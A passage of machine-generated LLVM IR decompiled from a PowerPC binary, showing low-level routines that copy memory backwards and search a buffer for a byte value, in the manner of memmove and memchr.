  store i32 ptrtoint (i32** @global_var_10010438.216 to i32), i32* %r3.global-to-local, align 4
  store i32 268477292, i32* @lr, align 4
  %v4_1000a368 = call i32 @function_100068e0(i16* bitcast (i32** @global_var_10010438.216 to i16*), i32 %v3_1000a320)
  store i32 %v4_1000a368, i32* %r3.global-to-local, align 4
  %v0_1000a36c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a36c

dec_label_pc_1000a36c:                            ; preds = %dec_label_pc_1000a358, %dec_label_pc_1000a360
  %v0_1000a3ac = phi i32 [ %v2_1000a350, %dec_label_pc_1000a358 ], [ %v0_1000a36c.pre, %dec_label_pc_1000a360 ]
  %v1_1000a36c = add i32 %v0_1000a3ac, 8
  %v2_1000a36c = inttoptr i32 %v1_1000a36c to i32*
  %v3_1000a36c = load i32, i32* %v2_1000a36c, align 4
  store i32 %v3_1000a36c, i32* %r9.global-to-local, align 4
  %v1_1000a370 = add i32 %v0_1000a3ac, 12
  %v2_1000a370 = inttoptr i32 %v1_1000a370 to i32*
  %v3_1000a370 = load i32, i32* %v2_1000a370, align 4
  store i32 %v3_1000a370, i32* %r0.global-to-local, align 4
  %v4_1000a374 = icmp eq i32 %v3_1000a370, %v3_1000a36c
  br i1 %v4_1000a374, label %dec_label_pc_1000a3ac, label %dec_label_pc_1000a37c

dec_label_pc_1000a37c:                            ; preds = %dec_label_pc_1000a36c
  %v2_1000a37c = add i32 %v0_1000a3ac, 24
  %v3_1000a37c = inttoptr i32 %v2_1000a37c to i32*
  store i32 %v3_1000a36c, i32* %v3_1000a37c, align 4
  %v0_1000a380 = load i32, i32* @r31, align 4
  store i32 %v0_1000a380, i32* %r3.global-to-local, align 4
  store i32 268477320, i32* @lr, align 4
  %v3_1000a384 = call i32 @function_1000b890(i32 %v0_1000a380, i32 %v3_1000a36c)
  store i32 %v3_1000a384, i32* %r3.global-to-local, align 4
  %v3_1000a388 = icmp eq i32 %v3_1000a384, 0
  br i1 %v3_1000a388, label %dec_label_pc_1000a3cc, label %dec_label_pc_1000a390

dec_label_pc_1000a390:                            ; preds = %dec_label_pc_1000a37c
  %v0_1000a390 = load i32, i32* @r31, align 4
  %v1_1000a390 = add i32 %v0_1000a390, 20
  %v2_1000a390 = inttoptr i32 %v1_1000a390 to i32*
  %v3_1000a390 = load i32, i32* %v2_1000a390, align 4
  store i32 %v3_1000a390, i32* %r0.global-to-local, align 4
  %v1_1000a394 = add i32 %v0_1000a390, 16
  %v2_1000a394 = inttoptr i32 %v1_1000a394 to i32*
  %v3_1000a394 = load i32, i32* %v2_1000a394, align 4
  store i32 %v3_1000a394, i32* %r9.global-to-local, align 4
  %v2_1000a398 = add i32 %v0_1000a390, 24
  %v3_1000a398 = inttoptr i32 %v2_1000a398 to i32*
  store i32 %v3_1000a390, i32* %v3_1000a398, align 4
  %v0_1000a39c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a39c = add i32 %v0_1000a39c, 1
  store i32 %v1_1000a39c, i32* %r0.global-to-local, align 4
  %v1_1000a3a0 = inttoptr i32 %v0_1000a39c to i8*
  %v2_1000a3a0 = load i8, i8* %v1_1000a3a0, align 1
  %v3_1000a3a0 = zext i8 %v2_1000a3a0 to i32
  store i32 %v3_1000a3a0, i32* %r3.global-to-local, align 4
  %v1_1000a3a4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a3a4

dec_label_pc_1000a3a4:                            ; preds = %dec_label_pc_1000a330, %dec_label_pc_1000a390
  %v1_1000a3a4 = phi i32 [ %v1_1000a3a47, %dec_label_pc_1000a330 ], [ %v1_1000a3a4.pre, %dec_label_pc_1000a390 ]
  %v0_1000a3a4 = phi i32 [ %v1_1000a334, %dec_label_pc_1000a330 ], [ %v1_1000a39c, %dec_label_pc_1000a390 ]
  %v2_1000a3a4 = add i32 %v1_1000a3a4, 16
  %v3_1000a3a4 = inttoptr i32 %v2_1000a3a4 to i32*
  store i32 %v0_1000a3a4, i32* %v3_1000a3a4, align 4
  br label %dec_label_pc_1000a3d0

dec_label_pc_1000a3ac:                            ; preds = %dec_label_pc_1000a36c
  %v1_1000a3ac = inttoptr i32 %v0_1000a3ac to i16*
  store i32 %v0_1000a3ac, i32* %r3.global-to-local, align 4
  %v2_1000a3b0 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268477372, i32* @lr, align 4
  %v5_1000a3b8 = call i32 @function_1000b720(i16* %v1_1000a3ac, i32 %v2_1000a3b0, i32 1)
  store i32 %v5_1000a3b8, i32* %r3.global-to-local, align 4
  %v3_1000a3bc = icmp eq i32 %v5_1000a3b8, 0
  br i1 %v3_1000a3bc, label %dec_label_pc_1000a3cc, label %dec_label_pc_1000a3c4

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a3ac
  %v3_1000a3c4 = load i8, i8* %stack_var_-24, align 1
  %v4_1000a3c4 = sext i8 %v3_1000a3c4 to i32
  store i32 %v4_1000a3c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a3d0

dec_label_pc_1000a3cc:                            ; preds = %dec_label_pc_1000a2e0, %dec_label_pc_1000a3ac, %dec_label_pc_1000a37c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a3d0

dec_label_pc_1000a3d0:                            ; preds = %dec_label_pc_1000a3c4, %dec_label_pc_1000a3a4, %dec_label_pc_1000a348, %dec_label_pc_1000a2fc, %dec_label_pc_1000a3cc
  store i32 %v0_1000a2ac, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a2b4, i32* @r31, align 4
  %v0_1000a3e0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a3e0

; uselistorder directives
  uselistorder i32 %v0_1000a3ac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000a330, { 1, 0 }
  uselistorder i32 %v3_1000a320, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a300, { 1, 0 }
  uselistorder i32 %v3_1000a2f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v2_1000a350, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 13, 3, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 14, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_10010438.216 to i16*), { 1, 0 }
  uselistorder i16* @global_var_10010114.190, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a3d0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a3cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a3a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a36c, { 1, 0 }
}

define i32 @function_1000a3e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a3e4:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000a3e4 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000a3ec = load i32, i32* @r5, align 4
  store i32 %v0_1000a3ec, i32* @r11, align 4
  br i1 %v2_1000a3e4, label %dec_label_pc_1000a3f8, label %dec_label_pc_1000a3f4

dec_label_pc_1000a3f4:                            ; preds = %dec_label_pc_1000a3e4
  %v0_1000a3f4 = call i32 @function_10006d8c()
  store i32 %v0_1000a3f4, i32* @r3, align 4
  %v0_1000a3f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000a3f8

dec_label_pc_1000a3f8:                            ; preds = %dec_label_pc_1000a3e4, %dec_label_pc_1000a3f4
  %v0_1000a3f8 = phi i32 [ %v0_1000a3ec, %dec_label_pc_1000a3e4 ], [ %v0_1000a3f8.pre, %dec_label_pc_1000a3f4 ]
  %v1_1000a3f8 = call i32 @__asm_rlwinm.(i32 %v0_1000a3f8, i32 29, i32 3, i32 31)
  store i32 %v1_1000a3f8, i32* %r9.global-to-local, align 4
  %v4_1000a3f8 = icmp eq i32 %v1_1000a3f8, 0
  %v1_1000a3fc = load i32, i32* @r5, align 4
  %v2_1000a3fc = add i32 %v1_1000a3fc, %arg2
  store i32 %v2_1000a3fc, i32* %r4.global-to-local, align 4
  %v0_1000a400 = load i32, i32* @r3, align 4
  %v2_1000a400 = add i32 %v0_1000a400, %v1_1000a3fc
  store i32 %v2_1000a400, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a3f8, label %dec_label_pc_1000a428, label %dec_label_pc_1000a408

dec_label_pc_1000a408:                            ; preds = %dec_label_pc_1000a3f8
  %v1_1000a408 = urem i32 %v2_1000a400, 4
  %v3_1000a408 = icmp eq i32 %v1_1000a408, 0
  br i1 %v3_1000a408, label %dec_label_pc_1000a410, label %dec_label_pc_1000a45c

dec_label_pc_1000a410:                            ; preds = %dec_label_pc_1000a474.dec_label_pc_1000a410_crit_edge, %dec_label_pc_1000a408
  %v1_1000a41c.pre = phi i32 [ %v1_1000a41c.pre.pre, %dec_label_pc_1000a474.dec_label_pc_1000a410_crit_edge ], [ %v2_1000a400, %dec_label_pc_1000a408 ]
  %v0_1000a410 = phi i32 [ %v1_1000a474, %dec_label_pc_1000a474.dec_label_pc_1000a410_crit_edge ], [ %v1_1000a3f8, %dec_label_pc_1000a408 ]
  store i32 %v0_1000a410, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a414

dec_label_pc_1000a414:                            ; preds = %dec_label_pc_1000a414, %dec_label_pc_1000a410
  %v1_1000a41c = phi i32 [ %v2_1000a420, %dec_label_pc_1000a414 ], [ %v1_1000a41c.pre, %dec_label_pc_1000a410 ]
  %v0_1000a414 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a414 = add i32 %v0_1000a414, -4
  %v2_1000a414 = inttoptr i32 %v1_1000a414 to i32*
  %v3_1000a414 = load i32, i32* %v2_1000a414, align 4
  %v1_1000a418 = add i32 %v0_1000a414, -8
  %v2_1000a418 = inttoptr i32 %v1_1000a418 to i32*
  %v3_1000a418 = load i32, i32* %v2_1000a418, align 4
  store i32 %v3_1000a418, i32* %r9.global-to-local, align 4
  store i32 %v1_1000a418, i32* %r4.global-to-local, align 4
  %v2_1000a41c = add i32 %v1_1000a41c, -4
  %v3_1000a41c = inttoptr i32 %v2_1000a41c to i32*
  store i32 %v3_1000a414, i32* %v3_1000a41c, align 4
  %v0_1000a420 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a420 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a420 = add i32 %v1_1000a420, -8
  %v3_1000a420 = inttoptr i32 %v2_1000a420 to i32*
  store i32 %v0_1000a420, i32* %v3_1000a420, align 4
  store i32 %v2_1000a420, i32* %r10.global-to-local, align 4
  %v0_1000a424 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a424 = add i32 %v0_1000a424, -1
  store i32 %v1_1000a424, i32* %ctr.global-to-local, align 4
  %v2_1000a424 = icmp eq i32 %v1_1000a424, 0
  br i1 %v2_1000a424, label %dec_label_pc_1000a428, label %dec_label_pc_1000a414

dec_label_pc_1000a428:                            ; preds = %dec_label_pc_1000a414, %dec_label_pc_1000a474, %dec_label_pc_1000a3f8
  %v0_1000a428 = load i32, i32* @r11, align 4
  %v1_1000a428 = urem i32 %v0_1000a428, 8
  store i32 %v1_1000a428, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000a428, 4
  br i1 %tmp, label %dec_label_pc_1000a440, label %dec_label_pc_1000a434

dec_label_pc_1000a434:                            ; preds = %dec_label_pc_1000a428
  %v0_1000a434 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a434 = add i32 %v0_1000a434, -4
  %v2_1000a434 = inttoptr i32 %v1_1000a434 to i32*
  %v3_1000a434 = load i32, i32* %v2_1000a434, align 4
  store i32 %v1_1000a434, i32* %r4.global-to-local, align 4
  %v1_1000a438 = add nsw i32 %v1_1000a428, -4
  store i32 %v1_1000a438, i32* %r5.global-to-local, align 4
  %v1_1000a43c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a43c = add i32 %v1_1000a43c, -4
  %v3_1000a43c = inttoptr i32 %v2_1000a43c to i32*
  store i32 %v3_1000a434, i32* %v3_1000a43c, align 4
  store i32 %v2_1000a43c, i32* %r10.global-to-local, align 4
  %v0_1000a440.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a440

dec_label_pc_1000a440:                            ; preds = %dec_label_pc_1000a428, %dec_label_pc_1000a434
  %v0_1000a448 = phi i32 [ %v1_1000a428, %dec_label_pc_1000a428 ], [ %v0_1000a440.pre, %dec_label_pc_1000a434 ]
  %v3_1000a440 = icmp eq i32 %v0_1000a448, 0
  br i1 %v3_1000a440, label %dec_label_pc_1000a480, label %dec_label_pc_1000a448

dec_label_pc_1000a448:                            ; preds = %dec_label_pc_1000a440
  store i32 %v0_1000a448, i32* %ctr.global-to-local, align 4
  %v2_1000a450.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a44c

dec_label_pc_1000a44c:                            ; preds = %dec_label_pc_1000a44c, %dec_label_pc_1000a448
  %v2_1000a450 = phi i32 [ %v3_1000a450, %dec_label_pc_1000a44c ], [ %v2_1000a450.pre, %dec_label_pc_1000a448 ]
  %v0_1000a44c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a44c = add i32 %v0_1000a44c, -1
  %v2_1000a44c = inttoptr i32 %v1_1000a44c to i8*
  %v3_1000a44c = load i8, i8* %v2_1000a44c, align 1
  store i32 %v1_1000a44c, i32* %r4.global-to-local, align 4
  %v3_1000a450 = add i32 %v2_1000a450, -1
  %v4_1000a450 = inttoptr i32 %v3_1000a450 to i8*
  store i8 %v3_1000a44c, i8* %v4_1000a450, align 1
  store i32 %v3_1000a450, i32* %r10.global-to-local, align 4
  %v0_1000a454 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a454 = add i32 %v0_1000a454, -1
  store i32 %v1_1000a454, i32* %ctr.global-to-local, align 4
  %v2_1000a454 = icmp eq i32 %v1_1000a454, 0
  br i1 %v2_1000a454, label %dec_label_pc_1000a480, label %dec_label_pc_1000a44c

dec_label_pc_1000a45c:                            ; preds = %dec_label_pc_1000a408
  %v1_1000a45c = sub nsw i32 4, %v1_1000a408
  store i32 %v1_1000a45c, i32* %ctr.global-to-local, align 4
  %v2_1000a464 = sub i32 %v1_1000a3fc, %v1_1000a45c
  store i32 %v2_1000a464, i32* @r11, align 4
  %v1_1000a4689 = add i32 %v2_1000a3fc, -1
  %v2_1000a46810 = inttoptr i32 %v1_1000a4689 to i8*
  %v3_1000a46811 = load i8, i8* %v2_1000a46810, align 1
  store i32 %v1_1000a4689, i32* %r4.global-to-local, align 4
  %v3_1000a46c13 = add i32 %v2_1000a400, -1
  %v4_1000a46c14 = inttoptr i32 %v3_1000a46c13 to i8*
  store i8 %v3_1000a46811, i8* %v4_1000a46c14, align 1
  store i32 %v3_1000a46c13, i32* %r10.global-to-local, align 4
  %v0_1000a47015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a47016 = add i32 %v0_1000a47015, -1
  store i32 %v1_1000a47016, i32* %ctr.global-to-local, align 4
  %v2_1000a47017 = icmp eq i32 %v1_1000a47016, 0
  br i1 %v2_1000a47017, label %dec_label_pc_1000a474, label %dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge

dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge: ; preds = %dec_label_pc_1000a45c, %dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge
  %v3_1000a46c18 = phi i32 [ %v3_1000a46c, %dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge ], [ %v3_1000a46c13, %dec_label_pc_1000a45c ]
  %v0_1000a468.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a468 = add i32 %v0_1000a468.pre, -1
  %v2_1000a468 = inttoptr i32 %v1_1000a468 to i8*
  %v3_1000a468 = load i8, i8* %v2_1000a468, align 1
  store i32 %v1_1000a468, i32* %r4.global-to-local, align 4
  %v3_1000a46c = add i32 %v3_1000a46c18, -1
  %v4_1000a46c = inttoptr i32 %v3_1000a46c to i8*
  store i8 %v3_1000a468, i8* %v4_1000a46c, align 1
  store i32 %v3_1000a46c, i32* %r10.global-to-local, align 4
  %v0_1000a470 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a470 = add i32 %v0_1000a470, -1
  store i32 %v1_1000a470, i32* %ctr.global-to-local, align 4
  %v2_1000a470 = icmp eq i32 %v1_1000a470, 0
  br i1 %v2_1000a470, label %dec_label_pc_1000a474, label %dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge

dec_label_pc_1000a474:                            ; preds = %dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge, %dec_label_pc_1000a45c
  %v0_1000a474 = load i32, i32* @r11, align 4
  %v1_1000a474 = call i32 @__asm_rlwinm.(i32 %v0_1000a474, i32 29, i32 3, i32 31)
  store i32 %v1_1000a474, i32* %r9.global-to-local, align 4
  %v4_1000a474 = icmp eq i32 %v1_1000a474, 0
  br i1 %v4_1000a474, label %dec_label_pc_1000a428, label %dec_label_pc_1000a474.dec_label_pc_1000a410_crit_edge

dec_label_pc_1000a474.dec_label_pc_1000a410_crit_edge: ; preds = %dec_label_pc_1000a474
  %v1_1000a41c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a410

dec_label_pc_1000a480:                            ; preds = %dec_label_pc_1000a44c, %dec_label_pc_1000a440
  %v0_1000a480 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000a480

; uselistorder directives
  uselistorder i32 %v1_1000a474, { 1, 2, 0 }
  uselistorder i32 %v1_1000a470, { 1, 0 }
  uselistorder i32 %v3_1000a46c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a454, { 1, 0 }
  uselistorder i32 %v3_1000a450, { 1, 2, 0 }
  uselistorder i32 %v1_1000a428, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000a424, { 1, 0 }
  uselistorder i32 %v2_1000a420, { 1, 2, 0 }
  uselistorder i32 %v1_1000a408, { 1, 0 }
  uselistorder i32 %v2_1000a400, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000a3fc, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1000a468.dec_label_pc_1000a468_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a440, { 1, 0 }
  uselistorder label %dec_label_pc_1000a428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a3f8, { 1, 0 }
}

define i32 @function_1000a488(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000a488:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000a48c = urem i32 %arg1, 256
  store i32 %v1_1000a48c, i32* %r4.global-to-local, align 4
  %v0_1000a4ac7 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000a4b013 = icmp eq i32 %arg2, 0
  br i1 %v2_1000a4b013, label %dec_label_pc_1000a4b8, label %dec_label_pc_1000a4b4

dec_label_pc_1000a498:                            ; preds = %dec_label_pc_1000a4b4
  %v1_1000a498 = inttoptr i32 %v0_1000a498 to i8*
  %v2_1000a498 = load i8, i8* %v1_1000a498, align 1
  %v3_1000a498 = zext i8 %v2_1000a498 to i32
  %v0_1000a49c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a49c = add i32 %v0_1000a49c, -1
  store i32 %v1_1000a49c, i32* %r5.global-to-local, align 4
  %v1_1000a4a0 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a4a0 = icmp eq i32 %v3_1000a498, %v1_1000a4a0
  %v0_1000a4a4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a4a0, i32 %v0_1000a4a4)
  %v0_1000a4a8 = load i32, i32* @r3, align 4
  %v1_1000a4a8 = add i32 %v0_1000a4a8, 1
  store i32 %v1_1000a4a8, i32* @r3, align 4
  %v0_1000a4b0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a4b0 = add i32 %v0_1000a4b0, -1
  store i32 %v1_1000a4b0, i32* %ctr.global-to-local, align 4
  %v2_1000a4b0 = icmp eq i32 %v1_1000a4b0, 0
  br i1 %v2_1000a4b0, label %dec_label_pc_1000a4b8.loopexit, label %dec_label_pc_1000a4b4

dec_label_pc_1000a4b4:                            ; preds = %dec_label_pc_1000a488, %dec_label_pc_1000a498
  %v0_1000a498 = phi i32 [ %v1_1000a4a8, %dec_label_pc_1000a498 ], [ %v0_1000a4ac7, %dec_label_pc_1000a488 ]
  %v0_1000a4b4.in.in = phi i32 [ %v1_1000a4a8, %dec_label_pc_1000a498 ], [ %v0_1000a4ac7, %dec_label_pc_1000a488 ]
  %v0_1000a4b4.in = urem i32 %v0_1000a4b4.in.in, 4
  %v0_1000a4b4 = icmp eq i32 %v0_1000a4b4.in, 0
  br i1 %v0_1000a4b4, label %dec_label_pc_1000a4b8.loopexit, label %dec_label_pc_1000a498

dec_label_pc_1000a4b8.loopexit:                   ; preds = %dec_label_pc_1000a4b4, %dec_label_pc_1000a498
  %v0_1000a4e016.ph = phi i32 [ %v1_1000a4a8, %dec_label_pc_1000a498 ], [ %v0_1000a498, %dec_label_pc_1000a4b4 ]
  %v0_1000a4b8.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000a4bc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a4b8

dec_label_pc_1000a4b8:                            ; preds = %dec_label_pc_1000a4b8.loopexit, %dec_label_pc_1000a488
  %v0_1000a4bc = phi i32 [ 0, %dec_label_pc_1000a488 ], [ %v0_1000a4bc.pre, %dec_label_pc_1000a4b8.loopexit ]
  %v0_1000a4b8 = phi i32 [ %v1_1000a48c, %dec_label_pc_1000a488 ], [ %v0_1000a4b8.pre, %dec_label_pc_1000a4b8.loopexit ]
  %v0_1000a4e016 = phi i32 [ %v0_1000a4ac7, %dec_label_pc_1000a488 ], [ %v0_1000a4e016.ph, %dec_label_pc_1000a4b8.loopexit ]
  %v1_1000a4b8 = mul i32 %v0_1000a4b8, 256
  %v1_1000a4bc = udiv i32 %v0_1000a4bc, 4
  %v2_1000a4c0 = or i32 %v1_1000a4b8, %v0_1000a4b8
  %v1_1000a4c8 = mul i32 %v2_1000a4c0, 65536
  %v2_1000a4d4 = or i32 %v1_1000a4c8, %v2_1000a4c0
  store i32 %v1_1000a4bc, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000a4bc, 4
  br i1 %tmp, label %dec_label_pc_1000a568, label %dec_label_pc_1000a4e0

dec_label_pc_1000a4e0:                            ; preds = %dec_label_pc_1000a4b8, %dec_label_pc_1000a564.backedge
  %v0_1000a564 = phi i32 [ %v1_1000a564, %dec_label_pc_1000a564.backedge ], [ %v1_1000a4bc, %dec_label_pc_1000a4b8 ]
  %v0_1000a4e8 = phi i32 [ %v1_1000a4e8, %dec_label_pc_1000a564.backedge ], [ %v0_1000a4bc, %dec_label_pc_1000a4b8 ]
  %v0_1000a520 = phi i32 [ %v1_1000a4e4, %dec_label_pc_1000a564.backedge ], [ %v0_1000a4e016, %dec_label_pc_1000a4b8 ]
  %v1_1000a4e0 = inttoptr i32 %v0_1000a520 to i32*
  %v2_1000a4e0 = load i32, i32* %v1_1000a4e0, align 4
  %v1_1000a4e4 = add i32 %v0_1000a520, 4
  store i32 %v1_1000a4e4, i32* @r3, align 4
  %v1_1000a4e8 = add i32 %v0_1000a4e8, -4
  store i32 %v1_1000a4e8, i32* %r5.global-to-local, align 4
  %v1_1000a4ec = add i32 %v0_1000a520, 1
  %v2_1000a4f0 = xor i32 %v2_1000a4e0, %v2_1000a4d4
  %v1_1000a4f8 = add i32 %v2_1000a4f0, 2130640639
  %v2_1000a4fc = xor i32 %v1_1000a4f8, %v2_1000a4f0
  %v2_1000a500 = and i32 %v2_1000a4fc, -2130640640
  %v6_1000a500 = icmp eq i32 %v2_1000a500, -2130640640
  br i1 %v6_1000a500, label %dec_label_pc_1000a564.backedge, label %dec_label_pc_1000a50c

dec_label_pc_1000a564.backedge:                   ; preds = %dec_label_pc_1000a4e0, %dec_label_pc_1000a550
  %v1_1000a564 = add i32 %v0_1000a564, -1
  store i32 %v1_1000a564, i32* %ctr.global-to-local, align 4
  %v2_1000a564 = icmp eq i32 %v1_1000a564, 0
  br i1 %v2_1000a564, label %dec_label_pc_1000a568, label %dec_label_pc_1000a4e0

dec_label_pc_1000a50c:                            ; preds = %dec_label_pc_1000a4e0
  %v2_1000a50c = inttoptr i32 %v0_1000a520 to i8*
  %v3_1000a50c = load i8, i8* %v2_1000a50c, align 1
  %v4_1000a50c = zext i8 %v3_1000a50c to i32
  %v1_1000a510 = add i32 %v0_1000a520, 3
  %v1_1000a514 = add i32 %v0_1000a520, 2
  %v4_1000a518 = icmp eq i32 %v4_1000a50c, %v0_1000a4b8
  br i1 %v4_1000a518, label %dec_label_pc_1000a520, label %dec_label_pc_1000a528

dec_label_pc_1000a520:                            ; preds = %dec_label_pc_1000a50c
  ret i32 %v0_1000a520

dec_label_pc_1000a528:                            ; preds = %dec_label_pc_1000a50c
  %v2_1000a528 = inttoptr i32 %v1_1000a4ec to i8*
  %v3_1000a528 = load i8, i8* %v2_1000a528, align 1
  %v4_1000a528 = zext i8 %v3_1000a528 to i32
  %v4_1000a52c = icmp eq i32 %v4_1000a528, %v0_1000a4b8
  br i1 %v4_1000a52c, label %dec_label_pc_1000a534, label %dec_label_pc_1000a53c

dec_label_pc_1000a534:                            ; preds = %dec_label_pc_1000a528
  ret i32 %v1_1000a4ec

dec_label_pc_1000a53c:                            ; preds = %dec_label_pc_1000a528
  %v2_1000a53c = inttoptr i32 %v1_1000a514 to i8*
  %v3_1000a53c = load i8, i8* %v2_1000a53c, align 1
  %v4_1000a53c = zext i8 %v3_1000a53c to i32
  %v4_1000a540 = icmp eq i32 %v4_1000a53c, %v0_1000a4b8
  br i1 %v4_1000a540, label %dec_label_pc_1000a548, label %dec_label_pc_1000a550

dec_label_pc_1000a548:                            ; preds = %dec_label_pc_1000a53c
  ret i32 %v1_1000a514

dec_label_pc_1000a550:                            ; preds = %dec_label_pc_1000a53c
  %v2_1000a550 = inttoptr i32 %v1_1000a510 to i8*
  %v3_1000a550 = load i8, i8* %v2_1000a550, align 1
  %v4_1000a550 = zext i8 %v3_1000a550 to i32
  %v4_1000a554 = icmp eq i32 %v4_1000a550, %v0_1000a4b8
  br i1 %v4_1000a554, label %dec_label_pc_1000a55c, label %dec_label_pc_1000a564.backedge

dec_label_pc_1000a55c:                            ; preds = %dec_label_pc_1000a550
  ret i32 %v1_1000a510

dec_label_pc_1000a568:                            ; preds = %dec_label_pc_1000a564.backedge, %dec_label_pc_1000a4b8
  %v0_1000a57426 = phi i32 [ %v0_1000a4e016, %dec_label_pc_1000a4b8 ], [ %v1_1000a4e4, %dec_label_pc_1000a564.backedge ]
  %v0_1000a568 = phi i32 [ %v0_1000a4bc, %dec_label_pc_1000a4b8 ], [ %v1_1000a4e8, %dec_label_pc_1000a564.backedge ]
  %v1_1000a568 = add i32 %v0_1000a568, 1
  store i32 %v1_1000a568, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a568, i32* %ctr.global-to-local, align 4
  %v2_1000a5843 = icmp eq i32 %v0_1000a568, 0
  br i1 %v2_1000a5843, label %dec_label_pc_1000a588, label %dec_label_pc_1000a574

dec_label_pc_1000a574:                            ; preds = %dec_label_pc_1000a568, %dec_label_pc_1000a574.dec_label_pc_1000a574_crit_edge
  %v1_1000a578 = phi i32 [ %v1_1000a578.pre, %dec_label_pc_1000a574.dec_label_pc_1000a574_crit_edge ], [ %v0_1000a4b8, %dec_label_pc_1000a568 ]
  %v0_1000a574 = phi i32 [ %v1_1000a580, %dec_label_pc_1000a574.dec_label_pc_1000a574_crit_edge ], [ %v0_1000a57426, %dec_label_pc_1000a568 ]
  %v1_1000a574 = inttoptr i32 %v0_1000a574 to i8*
  %v2_1000a574 = load i8, i8* %v1_1000a574, align 1
  %v3_1000a574 = zext i8 %v2_1000a574 to i32
  %v4_1000a578 = icmp eq i32 %v3_1000a574, %v1_1000a578
  %v0_1000a57c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a578, i32 %v0_1000a57c)
  %v0_1000a580 = load i32, i32* @r3, align 4
  %v1_1000a580 = add i32 %v0_1000a580, 1
  store i32 %v1_1000a580, i32* @r3, align 4
  %v0_1000a584 = load i32, i32* %ctr.global-to-local, align 4
